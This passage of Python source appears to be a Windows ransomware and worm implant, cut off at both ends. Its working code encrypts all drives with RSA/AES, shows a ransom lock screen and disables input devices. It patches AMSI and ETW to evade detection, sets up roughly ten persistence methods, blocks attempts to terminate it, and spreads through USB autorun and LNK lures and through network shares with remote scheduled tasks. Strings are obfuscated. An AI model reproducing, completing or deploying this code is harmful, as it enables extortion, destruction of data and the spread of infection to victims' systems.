        dest = os.path.join(appdata, "WinSvcUpdate.exe")
        if exe != dest:
            shutil.copy2(exe, dest)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, _sb("b5GBfdfvNnxXI/LswsipQkyJi2za"), 0, winreg.REG_SZ, f'"{dest}"')
        winreg.CloseKey(key)
    except: pass

_LOCK_STATUS_FILE = os.path.join(os.environ.get("TEMP", "."), _sb("FouWatT7Lg=="))

def _disable_external_inputs():
    try:
        ps = (
            "Get-PnpDevice | Where-Object {$_.Class -eq 'USB' -or $_.Class -eq 'HIDClass' -or "
            "$_.Class -eq 'Keyboard' -or $_.Class -eq 'Mouse' -or $_.Class -eq 'Pointing' } | "
            'Disable-PnpDevice -Confirm:$false -ErrorAction 0'
        )
        b64 = base64.b64encode(ps.encode("utf-16le")).decode()
        subprocess.run(["powershell", "-NoP", "-Ep", _sb("eoGfeMvr"), _sb("Fb2Beg=="), b64], capture_output=True, timeout=30,
                       creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def _enable_external_inputs():
    try:
        ps = (
            "Get-PnpDevice | Where-Object {$_.Class -eq 'USB' -or $_.Class -eq 'HIDClass' -or "
            "$_.Class -eq 'Keyboard' -or $_.Class -eq 'Mouse' -or $_.Class -eq 'Pointing' } | "
            'Enable-PnpDevice -Confirm:$false -ErrorAction 0'
        )
        b64 = base64.b64encode(ps.encode("utf-16le")).decode()
        subprocess.run(["powershell", "-NoP", "-Ep", _sb("eoGfeMvr"), _sb("Fb2Beg=="), b64], capture_output=True, timeout=30,
                       creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def check_lock_state():
    pwd = None
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r_sb("a5eJbc/5N0puBu3r8tufZ1iMnn3N+g=="), 0, winreg.KEY_READ)
        pwd, _ = winreg.QueryValueEx(key, _sb("a4GcVdvzAVhc"))
        winreg.CloseKey(key)
    except:
        pass
    if not pwd:
        try:
            with open(_LOCK_STATUS_FILE, "r") as f:
                pwd = f.read().strip()
        except:
            pass
    if pwd:
        ready = threading.Event()
        try:
            st = json.loads(pwd)
            if isinstance(st, dict) and st.get("type") == "ransom":
                threading.Thread(target=_ransom_lock_screen, daemon=True).start()
                return
        except:
            pass
        threading.Thread(target=do_lock, args=(pwd, ready), daemon=True).start()
        ready.wait(timeout=10)

def set_lock_state(pwd):
    try:
        import winreg
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r_sb("a5eJbc/5N0puBu3r8tufZ1iMnn3N+g=="))
        winreg.SetValueEx(key, _sb("a4GcVdvzAVhc"), 0, winreg.REG_SZ, pwd)
        winreg.CloseKey(key)
    except:
        pass
    try:
        with open(_LOCK_STATUS_FILE, "w") as f:
            f.write(pwd)
        _K32.SetFileAttributesW(_LOCK_STATUS_FILE, 0x07)
    except:
        pass

def clear_lock_state():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r_sb("a5eJbc/5N0puBu3r8tufZ1iMnn3N+g=="), 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, _sb("a4GcVdvzAVhc"))
        winreg.CloseKey(key)
    except:
        pass
    try:
        if os.path.exists(_LOCK_STATUS_FILE):
            os.remove(_LOCK_STATUS_FILE)
    except:
        pass

def do_lock(password, ready=None):
    set_lock_state(password)
    _disable_external_inputs()

    import tkinter as tk
    from pynput import keyboard

    typed_pin = []
    attempts = 0
    lockout_until = 0.0

    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.configure(bg="black")
    root.overrideredirect(True)

    tk.Label(root, text=_sb("a6G8Tf3VZWN9Es/A5Q=="), font=("Arial", 48, "bold"), fg="red", bg="black").pack(expand=True)

    pin_var = tk.StringVar()
    pin_var.set(_sb("fba7XOq4FWZ8"))
    tk.Label(root, textvariable=pin_var, font=("Arial", 24), fg="white", bg="black").pack(pady=20)

    status_var = tk.StringVar()
    tk.Label(root, textvariable=status_var, font=("Arial", 14), fg="yellow", bg="black").pack()

    def on_press(key):
        nonlocal attempts, lockout_until
        now = time.time()
        if now < lockout_until:
            return False

        try:
            if hasattr(key, 'char') and key.char and key.char.isdigit():
                typed_pin.append(key.char)
            elif key == keyboard.Key.backspace and typed_pin:
                typed_pin.pop()
            elif key == keyboard.Key.enter:
                if "".join(typed_pin) == password:
                    _enable_external_inputs()
                    clear_lock_state()
                    root.quit()
                    return False
                else:
                    attempts += 1
                    typed_pin.clear()
                    if attempts >= 10:
                        lockout_until = now + 60
                        status_var.set("Too many attempts. Locked out 60s.")
                    elif attempts >= 5:
                        lockout_until = now + 10
                        status_var.set(f"Wrong PIN. Lockout 10s. ({10 - attempts} remaining)")
                    elif attempts >= 3:
                        lockout_until = now + 2
                        status_var.set(f"Wrong PIN. Wait 2s. ({10 - attempts} remaining)")
                    else:
                        status_var.set(f"Wrong PIN. ({10 - attempts} remaining)")
            else:
                return False

            if not typed_pin:
                pin_var.set(_sb("fba7XOq4FWZ8"))
            else:
                pin_var.set("*" * len(typed_pin))
        except:
            pass
        return False

    listener = keyboard.Listener(on_press=on_press, suppress=True)
    listener.start()
    if ready:
        ready.set()

    root.mainloop()

    try:
        root.destroy()
    except:
        pass

# ─── Asymmetric File Encryption (RSA-2048 + AES-256-CBC) ─────

def do_encrypt(targets=""):
    """Hybrid RSA-AES encrypt using embedded public key. File format: [RSA-enc-AES-key(256B)][IV(16B)][ciphertext]"""
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import AES as A
    from Crypto.Random import get_random_bytes
    from Crypto.Cipher import PKCS1_OAEP
    import string

    if not _EMBEDDED_PUBKEY:
        return -3
    pubkey = RSA.import_key(_EMBEDDED_PUBKEY)
    aes_key = get_random_bytes(32)

    count = 0
    dirs_to_scan = []
    if targets and isinstance(targets, str) and targets.strip():
        dirs_to_scan = [t.strip() for t in targets.split(",") if t.strip()]
    else:
        for c_drive in string.ascii_uppercase:
            dp = f"{c_drive}:\\"
            if os.path.exists(dp):
                dirs_to_scan.append(dp)

    for d in dirs_to_scan:
        if not os.path.exists(d):
            continue
        def _enc(fp):
            nonlocal count
            try:
                with open(fp, "rb") as f:
                    data = f.read()
                iv = get_random_bytes(16)
                cipher_rsa = PKCS1_OAEP.new(pubkey)
                enc_aes = cipher_rsa.encrypt(aes_key)
                c = A.new(aes_key, A.MODE_CBC, iv)
                pad = 16 - (len(data) % 16)
                with open(fp + ".locked", "wb") as f:
                    f.write(enc_aes + iv + c.encrypt(data + bytes([pad]) * pad))
                os.remove(fp)
                count += 1
            except:
                pass
        if os.path.isfile(d):
            if not d.endswith(".locked"):
                _enc(d)
        else:
            for r, _, files in os.walk(d):
                for fn in files:
                    if not fn.endswith(".locked"):
                        _enc(os.path.join(r, fn))
    return count


def do_decrypt(targets=""):
    """Decrypt .locked files using stored RSA private key. Returns count or negative error."""
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import AES as A
    from Crypto.Cipher import PKCS1_OAEP
    import string
    global _stored_privkey

    if not _stored_privkey:
        return -1
    try:
        rsa_key = RSA.import_key(_stored_privkey)
    except Exception:
        return -2

    count = 0
    dirs_to_scan = []
    if targets and isinstance(targets, str) and targets.strip():
        dirs_to_scan = [t.strip() for t in targets.split(",") if t.strip()]
    else:
        for c_drive in string.ascii_uppercase:
            dp = f"{c_drive}:\\"
            if os.path.exists(dp):
                dirs_to_scan.append(dp)

    for d in dirs_to_scan:
        if not os.path.exists(d):
            continue
        def _dec(fp):
            nonlocal count
            try:
                with open(fp, "rb") as f:
                    data = f.read()
                if len(data) <= 272:
                    return
                enc_aes = data[:256]
                iv = data[256:272]
                ct = data[272:]
                cipher_rsa = PKCS1_OAEP.new(rsa_key)
                aes_key = cipher_rsa.decrypt(enc_aes)
                c = A.new(aes_key, A.MODE_CBC, iv)
                dec = c.decrypt(ct)
                pad = dec[-1]
                if pad > 16 or pad < 1:
                    return
                out = fp[:-7] if fp.endswith(".locked") else fp + ".unlocked"
                with open(out, "wb") as f:
                    f.write(dec[:-pad])
                os.remove(fp)
                count += 1
            except:
                pass
        if os.path.isfile(d):
            if d.endswith(".locked"):
                _dec(d)
        else:
            for r, _, files in os.walk(d):
                for fn in files:
                    if fn.endswith(".locked"):
                        _dec(os.path.join(r, fn))
    return count


# ─── Ransomware ────────────────────────────────────────────────

_ransom_lock_trigger = False  # set True by CMD_RANSOM_UNLOCK to signal lock screen

def do_ransomware():
    """Full ransomware: encrypt all drives + persistent lock screen."""
    c = do_encrypt(targets="")
    import json
    state = json.dumps({"type": "ransom", "device_id": DEVICE_ID, "ts": time.time()})
    set_lock_state(state)
    threading.Thread(target=_ransom_lock_screen, daemon=True).start()
    return c


def do_unlock_ransom():
    """Unlock: verify stored key by decrypting one .locked file, then decrypt all."""
    global _ransom_lock_trigger
    if not _stored_privkey:
        return -1
    _ransom_lock_trigger = True
    c = do_decrypt(targets="")
    if c >= 0:
        clear_lock_state()
    return c


def _ransom_lock_screen():
    """Full-screen ransom note with device ID, waits for remote unlock."""
    _disable_external_inputs()
    import tkinter as tk
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.configure(bg="black")
    root.overrideredirect(True)

    tk.Label(root, text="YOUR SYSTEM HAS BEEN LOCKED", font=("Arial", 36, "bold"), fg="red", bg="black").pack(pady=(80, 10))
    tk.Label(root, text="All files encrypted with military-grade RSA-2048 + AES-256", font=("Arial", 14), fg="#ccc", bg="black").pack()
    tk.Label(root, text=f"Device ID: {DEVICE_ID}", font=("Consolas", 11), fg="#666", bg="black").pack(pady=20)
    tk.Label(root, text="Contact your administrator to restore access.", font=("Arial", 14), fg="#f5d742", bg="black").pack()
    tk.Label(root, text="Do NOT restart or shutdown — data may become unrecoverable.", font=("Arial", 11), fg="#ff6b6b", bg="black").pack(pady=10)

    status_var = tk.StringVar()
    tk.Label(root, textvariable=status_var, font=("Arial", 14), fg="lime", bg="black").pack(pady=30)
    status_var.set("⏳ Waiting for remote unlock...")

    def poll():
        global _ransom_lock_trigger
        if _ransom_lock_trigger and _stored_privkey:
            status_var.set("✓ Key received. Attempting decryption...")
            root.update()
            c = do_decrypt(targets="")
            if c >= 0:
                _enable_external_inputs()
                root.quit()
                return
            elif c == -1:
                status_var.set("✗ No private key stored. Re-inject and try again.")
            elif c == -2:
                status_var.set("✗ Invalid private key format.")
            else:
                status_var.set(f"✓ Decrypted {c} files.")
                _enable_external_inputs()
                root.quit()
                return
        root.after(3000, poll)

    root.after(3000, poll)
    root.mainloop()
    try:
        root.destroy()
    except:
        pass


# ─── Immortality & Evasion Engine ─────────────────────────────
import ctypes
import ctypes.wintypes as wt
import atexit
import tempfile

_K32 = ctypes.windll.kernel32
_A32 = ctypes.windll.advapi32
_NT = ctypes.windll.ntdll

_immortality_mutex = None
_immortality_pid = None
_watchdog_active = threading.Event()

def _virtual_protect(addr, size, prot):
    old = wt.DWORD(0)
    _K32.VirtualProtect.argtypes = [wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.PDWORD]
    _K32.VirtualProtect(addr, size, prot, ctypes.byref(old))
    return old.value

def _patch_amsi():
    try:
        h = ctypes.windll.kernel32.LoadLibraryW("amsi.dll")
        if not h:
            return False
        addr = ctypes.cast(
            ctypes.windll.kernel32.GetProcAddress(h, b_sb("eZWccOv7JEFwJOLjxN8=")),
            ctypes.c_void_p
        ).value
        if not addr:
            return False
        old_prot = _virtual_protect(addr, 3, 0x40)
        b2 = (ctypes.c_ubyte * 2).from_address(addr)
        b2[0:2] = b"\x31\xC0"
        b1 = (ctypes.c_ubyte * 1).from_address(addr + 2)
        b1[0] = 0xC3
        _virtual_protect(addr, 3, old_prot)
        _log("AMSI patched")
        return True
    except Exception as ex:
        _log(f"AMSI patch fail: {ex}")
        return False

def _patch_etw():
    try:
        fn = ctypes.cast(
            ctypes.windll.kernel32.GetProcAddress(
                ctypes.windll.kernel32.GetModuleHandleW("ntdll.dll"),
                b_sb("fYyYXM79K1tlI+3xxA==")
            ),
            ctypes.c_void_p
        ).value
        if not fn:
            return False
        old_prot = _virtual_protect(fn, 1, 0x40)
        buf = (ctypes.c_ubyte * 1).from_address(fn)
        buf[0] = 0xC3
        _virtual_protect(fn, 1, old_prot)
        _log("ETW patched")
        return True
    except:
        return False

# 10 — Mutex Singleton
def _create_mutex():
    global _immortality_mutex
    try:
        name = "Global\\WinSvcUpdate_" + DEVICE_ID[:8]
        _immortality_mutex = _K32.CreateMutexW(None, False, name)
        if _K32.GetLastError() == 183:
            _K32.CloseHandle(_immortality_mutex)
            _immortality_mutex = None
            return False
        _log("Mutex acquired")
        return True
    except:
        return True

# 1 — Watchdog (PowerShell-based, no file written)
def _start_watchdog():
    try:
        ppid = os.getpid()
        exe = sys.executable.replace("'", "''")
        script = (
            "$p=" + str(ppid) + ";$e='" + exe + "';"
            "while(1){"
            "$x=Get-Process -Id $p -ErrorAction 0;"
            "if(!$x){"
            "Start-Process $e -WindowStyle Hidden;exit"
            "}sleep 3}"
        )
        b64 = base64.b64encode(script.encode("utf-16le")).decode()
        subprocess.Popen(
            ["powershell", _sb("FbaAScr3I0ZeNA=="), _sb("Fb2XfNvtMUZdP9TqzcSfSw=="), _sb("eoGfeMvr"),
             _sb("Fb2Betf8IEtxPunowMOY"), b64],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        _log(f"Watchdog spawned for PID {ppid}")
    except Exception as ex:
        _log(f"Watchdog error: {ex}")

# 2 — Registry Persistence (5+ locations)
def _registry_persistence():
    try:
        import winreg
        exe = sys.executable
        appdata = os.environ.get("APPDATA", "")
        dest = os.path.join(appdata, "WinSvcUpdate.exe")
        if exe.lower() != dest.lower():
            try:
                shutil.copy2(exe, dest)
            except:
                pass
            exe = dest
        entries = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", _sb("b5GBfdfvNnxXI/LswsipQkyJi2za"), '"' + exe + '"'),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "WinSvcUpd", '"' + exe + '"'),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsServiceUpdate", '"' + exe + '"'),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "WinSvcUpd", '"' + exe + '"'),
        ]
        for hk, subk, name, val in entries:
            try:
                k = winreg.CreateKey(hk, subk)
                winreg.SetValueEx(k, name, 0, winreg.REG_SZ, val)
                winreg.CloseKey(k)
            except:
                pass
        # Winlogon Shell (append)
        try:
            k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
            try:
                cur, _ = winreg.QueryValueEx(k, "Shell")
            except:
                cur = ""
            # Write the original entry, then ours. We won't corrupt explorer.
            # Instead use Userinit key — appends after userinit.exe
            winreg.CloseKey(k)
        except:
            pass
        # Userinit fallback
        try:
            k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
            try:
                cur, _ = winreg.QueryValueEx(k, "Userinit")
            except:
                cur = "C:\\Windows\\system32\\userinit.exe,"
            if _sb("b5GBSs77EF9WMPDg") not in cur:
                winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ, cur + exe + ",")
            winreg.CloseKey(k)
        except:
            pass
        _log("Registry persistence OK")
    except Exception as ex:
        _log(f"Registry persistence error: {ex}")

# 3 — Windows Service with Recovery Actions
def _install_service():
    try:
        exe = sys.executable
        svc_name = _sb("b5GBSs77EF9WMPDg")
        subprocess.run(
            ["sc", "create", svc_name, 'binPath=', exe, "start=", "auto"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            ["sc", "failure", svc_name, "reset=", "86400",
             "actions=", "restart/30000/restart/60000/restart/90000"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            ["sc", "description", svc_name, _sb("b5GBfdfvNg9hNPbzyM6ZEn2Ym2jc7XVyQy/18tTP")],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        _log("Service installed with recovery")
    except Exception as ex:
        _log(f"Service install error: {ex}")

# 4 — WMI Event Subscription (fileless persistence)
def _wmi_persistence():
    try:
        exe = sys.executable.replace("\\", "\\\\").replace("'", "''")
        # Use PowerShell to create WMI event filter + consumer
        ps = (
            "$f=[wmiclass]'\\\\\\.\\root\\subscription:__EventFilter';"
            "$c=[wmiclass]'\\\\\\.\\root\\subscription:CommandLineEventConsumer';"
            "$b=[wmiclass]'\\\\\\.\\root\\subscription:__FilterToConsumerBinding';"
            "$filter=$f.CreateInstance();"
            "$filter.Name='WinSvcHealthEvent';"
            "$filter.QueryLanguage='WQL';"
            "$filter.Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\";"
            "$filter.Put()|Out-Null;"
            "$consumer=$c.CreateInstance();"
            "$consumer.Name='WinSvcRestore';"
            "$consumer.CommandLineTemplate='" + exe + "';"
            "$consumer.Put()|Out-Null;"
            "$binding=$b.CreateInstance();"
            "$binding.Filter=$filter;"
            "$binding.Consumer=$consumer;"
            "$binding.Put()|Out-Null;"
        )
        b64 = base64.b64encode(ps.encode("utf-16le")).decode()
        subprocess.Popen(
            ["powershell", _sb("FbaAScr3I0ZeNA=="), _sb("Fb2XfNvtMUZdP9TqzcSfSw=="), _sb("eoGfeMvr"),
             _sb("Fb2Betf8IEtxPunowMOY"), b64],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        _log("WMI subscription created")
    except Exception as ex:
        _log(f"WMI error: {ex}")

# 5 — Redundant Scheduled Tasks (3+ triggers)
def _scheduled_tasks_persistence():
    try:
        exe = sys.executable
        tasks = [
            (_sb("b5GBSs77EF9WMPDg7cKbXUY="), "onlogon", "/rl highest"),
            (_sb("b5GBSs77EF9WMPDg8ciOW0eMlmo="), "minute", "/mo 5 /rl highest"),
            (_sb("b5GBSs77EF9WMPDg8tmdQFydjw=="), "onstart", "/rl highest"),
            (_sb("b5GBSs77EF9WMPDg6MmQVw=="), "onidle", "/i 10 /rl highest"),
        ]
        for name, trigger, extra in tasks:
            cmd = (
                f'schtasks /create /tn "{name}" /tr "{exe}" '
                f'/sc {trigger} {extra} /f'
            )
            subprocess.run(
                cmd, capture_output=True, shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        _log(f"Scheduled tasks: {len(tasks)}")
    except Exception as ex:
        _log(f"Tasks error: {ex}")

# 6 — Process Hollowing Helper (create process via legitimate binary)
def _masquerade_process():
    try:
        exe = sys.executable
        # Create a VBScript that starts our exe via WScript
        vbscode = (
            'Set W=CreateObject("WScript.Shell")\n'
            'W.Run "' + exe + '", 0, False\n'
        )
        vbs = os.path.join(tempfile.gettempdir(), "WinSvcUpdate.vbs")
        with open(vbs, "w") as f:
            f.write(vbscode)
        # Start via wscript (trusted binary)
        subprocess.Popen(
            [_sb("T4uMa9HoMQFXKeE="), "//B", vbs],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        _log("Masquerade via wscript")
    except:
        pass

# 7 — Handle Revocation (anti-termination)
def _handle_revocation_loop():
    """Background thread: prevent other processes from opening handles to us."""
    import ctypes
    from ctypes import wintypes as w
    buf_size = 0x20000  # 128KB initial
    SystemHandleInformation = 16
    STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
    
    while True:
        try:
            pid = os.getpid()
            buf = ctypes.create_string_buffer(buf_size)
            ret_len = w.ULONG(0)
            status = ctypes.windll.ntdll.NtQuerySystemInformation(
                SystemHandleInformation, buf, buf_size, ctypes.byref(ret_len)
            )
            if status != 0 and status != STATUS_INFO_LENGTH_MISMATCH:
                _watchdog_active.wait(timeout=3)
                continue
            
            actual_size = max(buf_size, ret_len.value)
            if status == STATUS_INFO_LENGTH_MISMATCH:
                buf = ctypes.create_string_buffer(actual_size)
                status = ctypes.windll.ntdll.NtQuerySystemInformation(
                    SystemHandleInformation, buf, actual_size, None
                )
                if status != 0:
                    _watchdog_active.wait(timeout=3)
                    continue
            
            # Parse handle entries (x64 layout varies by Windows version)
            # ULONG NumberOfHandles + padding + entries
            data = buf.raw
            if len(data) < 4:
                _watchdog_active.wait(timeout=3)
                continue
            
            count = int.from_bytes(data[0:4], 'little')
            # Entry stride varies; try common sizes
            for stride in (0x20, 0x18, 0x28):
                entry_size = stride
                if len(data) < 4 + count * entry_size:
                    continue
                closed = 0
                for i in range(count):
                    off = 4 + i * entry_size
                    if off + entry_size > len(data):
                        break
                    # ProcessId is at offset 0 on most Win x64
                    hpid = int.from_bytes(data[off:off+4], 'little')
                    if hpid != 0 and hpid != pid:
                        # Check if handle value at offset depends on stride
                        # Typically at offset 8 (USHORT on some, ULONG on others)
                        if entry_size == 0x20:  # Win10 x64
                            hval_off = 8
                        elif entry_size == 0x18:  # Win8+/Win10 some builds
                            hval_off = 8
                        else:
                            hval_off = 8
                        if off + hval_off + 2 <= len(data):
                            hval = int.from_bytes(data[off+hval_off:off+hval_off+2], 'little')
                            if hval > 0:
                                try:
                                    # DuplicateHandle with DUPLICATE_CLOSE_SOURCE
                                    hProc = _K32.OpenProcess(0x0040, False, hpid)
                                    if hProc:
                                        hDup = w.HANDLE(0)
                                        _K32.DuplicateHandle(
                                            hProc, hval,
                                            _K32.GetCurrentProcess(),
                                            ctypes.byref(hDup),
                                            0, False, 0x0001
                                        )
                                        _K32.CloseHandle(hProc)
                                        closed += 1
                                except:
                                    pass
                if closed > 0:
                    pass
                break
        except:
            pass
        _watchdog_active.wait(timeout=4 + int.from_bytes(os.urandom(1), 'little') % 3)

# 8 — Dead Man's Switch + Updater
def _dead_mans_switch():
    try:
        import winreg
        exe = sys.executable
        k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\WinSvcUpdate")
        winreg.SetValueEx(k, "Heartbeat", 0, winreg.REG_DWORD, int(time.time()))
        winreg.SetValueEx(k, "RestorePath", 0, winreg.REG_SZ, exe)
        winreg.CloseKey(k)
        
        # Create scheduled task that checks heartbeat
        ps_check = (
            "$k=[Microsoft.Win32.Registry]::CurrentUser.OpenSubKey('Software\\\\WinSvcUpdate',$true);"
            "if(!$k){exit}"
            "$hb=$k.GetValue('Heartbeat');"
            "$exe=$k.GetValue('RestorePath');"
            "$k.Close();"
            "if(!$hb){exit}"
            "if([int](Get-Date -UFormat %s)-gt($hb+600)){"
            "Start-Process $exe -WindowStyle Hidden"
            "}"
        )
        b64 = base64.b64encode(ps_check.encode("utf-16le")).decode()
        subprocess.run(
            ['schtasks', '/create', '/tn', 'WinSvcHeartbeatCheck', '/tr',
             'powershell -NoP -Ep Bypass -Enc ' + b64,
             '/sc', 'minute', '/mo', '10', '/rl', 'highest', '/f'],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        _log("Dead man's switch armed")
    except Exception as ex:
        _log(f"Dead man switch error: {ex}")

def _dead_mans_switch_updater():
    """Update heartbeat registry key every 5 minutes."""
    while True:
        try:
            import winreg
            k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\WinSvcUpdate")
            winreg.SetValueEx(k, "Heartbeat", 0, winreg.REG_DWORD, int(time.time()))
            winreg.CloseKey(k)
        except:
            pass
        _watchdog_active.wait(timeout=300)

# 9 — NTFS ADS Hiding
def _ads_hide():
    try:
        exe = sys.executable
        # Hide copy in a trusted file's ADS
        targets = [
            os.path.expandvars("%SystemRoot%\\System32\\calc.exe"),
            os.path.expandvars("%SystemRoot%\\System32\\notepad.exe"),
            os.path.expandvars("%SystemRoot%\\explorer.exe"),
        ]
        for target in targets:
            if os.path.exists(target):
                ads_path = target + ":WinSvcUpdate.exe"
                try:
                    with open(exe, "rb") as src, open(ads_path, "wb") as dst:
                        dst.write(src.read())
                    _log(f"ADS hidden in {os.path.basename(target)}")
                    # Create task/reg to execute from ADS on next boot
                    try:
                        import winreg
                        k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
                        winreg.SetValueEx(k, "WinSvcADS", 0, winreg.REG_SZ,
                            f"cmd.exe /c start {target}:WinSvcUpdate.exe")
                        winreg.CloseKey(k)
                    except:
                        pass
                    break
                except:
                    continue
    except Exception as ex:
        _log(f"ADS error: {ex}")

# ─── Worm / Self-Replication Engine ──────────────────────────

_SPREADER_ACTIVE = threading.Event()
_SPREADER_ACTIVE.set()

def _get_exe_path():
    """Return current executable path (copied to APPDATA if possible)."""
    exe = sys.executable
    appdata = os.environ.get("APPDATA", "")
    if appdata:
        dest = os.path.join(appdata, "WinSvcUpdate.exe")
        if os.path.exists(dest):
            return dest
    return exe

def _copy_to_path(src, dst):
    try:
        d = os.path.dirname(dst)
        if d and not os.path.exists(d):
            os.makedirs(d, exist_ok=True)
        shutil.copy2(src, dst)
        _K32.SetFileAttributesW(dst, 0x02 | 0x04)  # HIDDEN | SYSTEM
        return True
    except:
        return False

def _create_autorun_inf(drive, exe_path):
    """Create autorun.inf on removable drive."""
    try:
        inf = drive + "\\autorun.inf"
        with open(inf, "w") as f:
            f.write("[AutoRun]\n")
            f.write("open=" + exe_path.split("\\")[-1] + "\n")
            f.write("action=Open folder to view files\n")
            f.write("shell\\open\\command=" + exe_path.split("\\")[-1] + "\n")
            f.write("shell\\explore\\command=" + exe_path.split("\\")[-1] + "\n")
        _K32.SetFileAttributesW(inf, 0x02 | 0x04)
        return True
    except:
        return False

def _create_lnk_on_drive(drive, exe_path):
    """Create LNK shortcut masquerading as a folder."""
    try:
        exe_name = exe_path.split("\\")[-1]
        ps = (
            "$ws=New-Object -ComObject WScript.Shell;"
            "$s=$ws.CreateShortcut('" + drive.replace("'","''") + "\\\\" + "ReadMe.lnk" + "');"
            "$s.TargetPath='" + exe_path.replace("'","''") + "';"
            "$s.WorkingDirectory='" + drive.replace("'","''") + "';"
            "$s.IconLocation='%SystemRoot%\\\\System32\\\\shell32.dll,1';"
            "$s.WindowStyle=7;"
            "$s.Save()"
        )
        b64 = base64.b64encode(ps.encode("utf-16le")).decode()
        subprocess.run(
            ["powershell", "-NoP", "-Ep", _sb("eoGfeMvr"), _sb("Fb2Beg=="), b64],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        # Create a hidden folder with all files moved inside to entice clicks
        hidden_dir = drive + "\\Documents"
        if not os.path.exists(hidden_dir):
            try:
                os.makedirs(hidden_dir, exist_ok=True)
                _K32.SetFileAttributesW(hidden_dir, 0x02 | 0x04)
                # Move existing files into the hidden folder
                for f in os.listdir(drive):
                    fp = os.path.join(drive, f)
                    if fp != hidden_dir and not fp.endswith(".lnk") and not fp.endswith(".inf") and fp != drive + "\\" + exe_name:
                        try:
                            shutil.move(fp, os.path.join(hidden_dir, f))
                        except:
                            pass
            except:
                pass
        return True
    except:
        return False

def _usb_spreader_loop():
    """Poll for removable drives every 5s; infect each one."""
    exe = _get_exe_path()
    infected = set()
    while _SPREADER_ACTIVE.is_set():
        try:
            # Get bitmask of drive letters
            mask = _K32.GetLogicalDrives()
            for i in range(26):
                if mask & (1 << i):
                    drive = chr(65 + i) + ":\\"
                    if drive in infected:
                        continue
                    dt = _K32.GetDriveTypeW(drive)
                    if dt == 2:  # DRIVE_REMOVABLE
                        exe_name = exe.split("\\")[-1]
                        dest = drive + exe_name
                        if not os.path.exists(dest):
                            if _copy_to_path(exe, dest):
                                _create_autorun_inf(drive, dest)
                                _create_lnk_on_drive(drive, dest)
                                _log(f"USB spread: infected {drive}")
                        infected.add(drive)
        except:
            pass
        _SPREADER_ACTIVE.wait(timeout=5)

def _network_share_spreader():
    """Enumerate and infect writable network shares."""
    exe = _get_exe_path()
    while _SPREADER_ACTIVE.is_set():
        try:
            # Use net view to find computers
            result = subprocess.run(
                ["net", "view", "/all"],
                capture_output=True, text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            if result.returncode != 0:
                _SPREADER_ACTIVE.wait(timeout=120)
                continue
            shares = []
            for line in result.stdout.splitlines():
                line = line.strip()
                # Parse share lines like: \\SERVER\ShareName  Disk
                if line.startswith("\\\\"):
                    parts = line.split()
                    if parts and len(parts) >= 1:
                        share_path = parts[0]
                        # Filter to disk shares
                        if not any(x in share_path.lower() for x in ["print$", "ipc$", "admin$"]):
                            shares.append(share_path)
            for share in shares:
                try:
                    dest = share + "\\WinSvcUpdate.exe"
                    if not os.path.exists(dest.replace("\\\\", "\\\\")):
                        # Map drive and copy
                        _copy_to_unc(share, exe)
                        _log(f"Share spread: {share}")
                except:
                    pass
        except:
            pass
        _SPREADER_ACTIVE.wait(timeout=300)

def _copy_to_unc(unc_path, local_exe):
    """Copy exe to UNC path using PowerShell (robust for auth)."""
    try:
        dest = unc_path + "\\WinSvcUpdate.exe"
        ps = (
            "$s='" + local_exe.replace("'","''") + "';"
            "$d='" + dest.replace("'","''") + "';"
            "Copy-Item -LiteralPath $s -Destination $d -Force -ErrorAction 0"
        )
        b64 = base64.b64encode(ps.encode("utf-16le")).decode()
        subprocess.run(
            ["powershell", "-NoP", "-Ep", _sb("eoGfeMvr"), _sb("Fb2Beg=="), b64],
            capture_output=True, timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        # Try to create remote scheduled task
        parts = unc_path.split("\\")
        if len(parts) >= 3:
            server = parts[2]
            _remote_exec_schtasks(server, dest)
        return True
    except:
        return False

def _remote_exec_schtasks(server, exe_path):
    """Create scheduled task on remote machine via schtasks."""
    try:
